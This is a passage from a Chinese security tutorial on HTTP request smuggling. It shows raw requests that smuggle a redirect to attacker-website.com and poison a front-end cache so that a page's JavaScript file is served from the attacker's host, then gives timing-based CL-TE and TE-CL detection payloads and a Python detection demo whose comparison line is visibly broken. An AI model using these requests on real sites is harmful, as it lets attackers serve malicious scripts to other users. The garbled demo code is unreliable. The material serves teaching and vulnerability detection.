    Transfer-Encoding: chunked
    0
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: X
此时后端服务器处理下一个用户的请求时将变成：
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: XGET /scripts/include.js HTTP/1.1
    Host: vulnerable-website.com
    HTTP/1.1 301 Moved Permanently
    Location: https://attacker-website.com/home/
此时受害者请求的一个JS，该文件是由页面导入的。此时攻击者可以通过在响应中返回恶意JS。
**6 web缓存投毒**
基于2.5节开放重定向的基础上，如果前端服务器启用了内容缓存，那么后端服务器返回之后，前端服务器将缓存/static/include.js为攻击者的js。
这个影响是持久的，当其他用户请求此URL时，他们也将会重定向到attacker-website.com。
    GET /static/include.js HTTP/1.1
    Host: vulnerable-website.com
    HTTP/1.1 301 Moved Permanently
    Location: https://attacker-website.com/home/
###  0x03 检测思路
检测思路来自于
[这里](https://blog.riskivy.com/%E6%B5%81%E9%87%8F%E5%A4%B9%E5%B8%A6http-request-smuggling-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0/)，这里提供下检测demo。
**1 CL-TE**
**Payload:**
    POST / HTTP/1.1
    Host: test.com
    Transfer-Encoding: chunked
    Content-Length: 4
    1\r\n
    Z\r\n
    Q\r\n
    \r\n
    \r\n
**检测思路：**
`Content-Length` 为 4时，此时后端chunk收到的长度为1的数据块，但是没有结束标志，一直等待，导致前端响应超时（一般超过5s）。
    POST / HTTP/1.1
    Host: test.com
    Transfer-Encoding: chunked
    Content-Length: 4
    1\r\n
    Z
`Content-Length` 为 11时，此时的G是一个无效的块大小值，所以请求结束，不会超时。
    POST / HTTP/1.1
    Host: test.com
    Transfer-Encoding: chunked
    Content-Length: 11
    1\r\n
    Z\r\n
    G\r\n
    \r\n
因此如果 `Content-Length` 为 4的响应大于5s ，且 `Content-Length` 为 4的请求时间远大于 `Content-Length` 为 11的请求时间，说明存在漏洞。
**2 TE-CL**
**Payload：**
    POST / HTTP/1.1
    Host: test.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding : chunked
    0\r\n
    \r\n
    X
**检测思路：**
`Content-Length` 为 6时，后端处理的`Content-Length`为6，但收到的数据体0\r\n\r\n，因此后端会一直等待第6个字节，直到超时。
    POST / HTTP/1.1
    Host: test.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding : chunked
    0\r\n
    \r\n
`Content-Length` 为 5时，后端收到的数据体0\r\n\r\n，不会超时。
    POST / HTTP/1.1
    Host: test.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding : chunked
    0\r\n
    \r\n
因此如果 `Content-Length` 为 6的响应大于5s ，且 `Content-Length` 为 6的请求时间远大于 `Content-Length` 为 5的请求时间，说明存在漏洞。
**3 核心demo实现**
因为CL-TE和TE-CL互斥，因此如果存在CL-TE就跳过TE-CL检测，但检测到存在了漏洞时，进行recheck确认后输出。
完整代码：
    def check_CLTE(self):
        result = self.calcTime(4, "1\r\nZ\r\nQ\r\n\r\n\r\n", 11, "1\r\nZ\r\nQ\r\n\r\n\r\n")
        return result
    def check_TECL(self):
        result = self.calcTime(6, "0\r\n\r\nX", 5, "0\r\n\r\n")
        return result
    def calcTime(self, length_big_time, payload_big_time, length_small_time, payload_small_time):
        # todo 判断self.payload_headers 不为空
        for headers in self.payload_headers:
            headers['Content-Length'] = length_big_time
            big_time = self.getRespTime(headers, payload_big_time)
            if not big_time:
                big_time = 0
            if big_time  5 and big_time / small_time >= 5:
                self.valid = True
                self.type = "CL-TE"
                self.result_headers = [headers]
                return True
        return False
###  0x04 参考链接
  1. 
  2. [https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/](https://blog.riskivy.com/%E6%B5%81%E9%87%8F%E5%A4%B9%E5%B8%A6http-request-smuggling-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0/)
  3. 
  4. 